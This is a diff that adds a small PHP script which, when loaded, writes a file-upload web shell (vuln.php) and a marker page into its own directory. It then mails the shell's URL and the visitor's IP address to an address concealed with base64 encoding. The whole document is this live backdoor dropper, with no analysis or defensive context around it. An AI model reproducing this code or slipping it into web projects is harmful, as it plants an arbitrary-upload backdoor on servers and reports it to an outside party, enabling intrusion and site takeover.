@@ -1,0 +1,14 @@
+<title>YOLOOO</title>
+<?php
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+$baseUrl = base64_decode('aHR0cDovLw==') . $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], '', __DIR__);
+$recipient = base64_decode('c3ltY29uZm1haWxAZ21haWwuY29t');
+$text1 = '<title>YOLOOO</title><?php echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST["_upl"] == "Upload" ) {if(@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) { echo "<b> Uploaded ! :)<b><br><br>"; }else { echo "<b>Not uploaded ! </b><br><br>"; }}?>';
+$text2 = 'YOLOOO';
+file_put_contents(__DIR__ . '/vuln.php', $text1);
+file_put_contents(__DIR__ . '/vuln.htm', $text2);
+$msg = "vuln.php => $baseUrl/vuln.php\nvuln.htm => $baseUrl/vuln.htm\nIP: " . $_SERVER['REMOTE_ADDR'];
+mail($recipient, "Upload result", $msg);
+echo nl2br($msg);
+?>
